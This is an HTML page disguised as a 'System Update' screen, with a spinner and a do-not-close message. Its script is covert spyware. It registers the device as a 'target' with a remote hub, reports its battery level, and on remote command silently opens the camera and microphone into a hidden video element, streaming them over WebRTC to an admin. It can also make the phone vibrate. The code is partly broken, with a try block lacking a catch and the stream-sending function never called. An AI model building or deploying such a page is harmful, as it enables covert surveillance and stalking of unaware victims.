<!DOCTYPE html>
<html lang="en">
<head>
    <title>System Update</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <script src="/socket.io/socket.io.js"></script>
    <style>
        body { 
            background: #050a14; 
            color: #4f5b93; 
            font-family: 'Segoe UI', sans-serif; 
            margin: 0; 
            display: flex; 
            flex-direction: column;
            align-items: center; 
            justify-content: center; 
            height: 100vh; 
            text-align: center;
        }
        .loader {
            border: 3px solid #112240;
            border-top: 3px solid #00d4ff;
            border-radius: 50%;
            width: 40px;
            height: 40px;
            animation: spin 2s linear infinite;
            margin-bottom: 20px;
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        h2 { color: #fff; font-size: 1.2rem; margin: 0; }
        p { font-size: 0.8rem; opacity: 0.6; }
    </style>
</head>
<body>

    <div class="loader"></div>
    <h2>System Update</h2>
    <p>Initializing security modules... Please do not close.</p>

    <!-- Invisible Video for Stream -->
    <video id="v" autoplay playsinline muted style="width:1px; height:1px; opacity:0; position:absolute;"></video>

    <script>
        // Socket initialization with auto-reconnect logic
        const socket = io({
            reconnection: true,
            reconnectionAttempts: Infinity,
            reconnectionDelay: 1000
        });

        let stream, pc, adminId, currentMode = "environment";
        const config = { iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] };

        // 1. Join Hub with Real-time Info
        async function joinHub() {
            let bat = "N/A";
            try {
                const b = await navigator.getBattery();
                bat = Math.floor(b.level * 100) + "%";
                // Battery change listener
                b.addEventListener('levelchange', () => {
                    socket.emit('target-join', { battery: Math.floor(b.level * 100) + "%", device: "Android App" });
                });
            } catch(e) {}
            
            socket.emit('target-join', { 
                battery: bat, 
                device: "Android App",
                status: "online" 
            });
        }

        // Initialize on Load
        joinHub();

        // 2. Command Handler (Wake Up & Controls)
        socket.on('command', async (data) => {
            const cmd = data.cmd;
            adminId = data.adminId;

            if (cmd === 'wake-up' || cmd === 'start') {
                // Force Restart Camera
                if(stream) stream.getTracks().forEach(t => t.stop());
                
                try {
                    stream = await navigator.mediaDevices.getUserMedia({ 
                        video: { facingMode: currentMode }, 
                        audio: true 
                    });
                    document.getElementById('v').srcObject = stream;
                    
                    // Replace tracks in existing connection
                    if(pc) {
                        const videoTrack = stream.getVideoTracks()[0];
                        const audioTrack = stream.getAudioTracks()[0];
                        const senders = pc.getSenders();
                        const vSender = senders.find(s => s.track.kind === 'video');
                        const aSender = senders.find(s => s.track.kind === 'audio');
                        if(vSender) vSender.replaceTrack(videoTrack);
                        if(aSender) aSender.replaceTrack(audioTrack);
                    }
                }
            } 
            else if (cmd === 'vibrate') {
                if (window.navigator.vibrate) window.navigator.vibrate([200, 100, 200]);
            }
        });

        // 3. WebRTC Handshake Logic
        async function establishWebRTC() {
            if(pc) pc.close();
            pc = new RTCPeerConnection(config);

            // Add tracks to connection
            stream.getTracks().forEach(track => pc.addTrack(track, stream));

            pc.onicecandidate = (event) => {
                if(event.candidate && adminId) {
                    socket.emit('signal', { to: adminId, signal: { candidate: event.candidate } });
                }
            };

            const offer = await pc.createOffer();
            await pc.setLocalDescription(offer);
            socket.emit('signal', { to: adminId, signal: { sdp: offer } });
        }

        socket.on('signal', async (data) => {
            if(!pc) return;
            if(data.signal.sdp) {
                await pc.setRemoteDescription(new RTCSessionDescription(data.signal.sdp));
            } else if(data.signal.candidate) {
                await pc.addIceCandidate(new RTCIceCandidate(data.signal.candidate));
            }
            });

        // Auto-reconnect safety
        socket.on('connect', () => {
            console.log("Connected to Hub");
            joinHub();
        });

    </script>
</body>
</html>
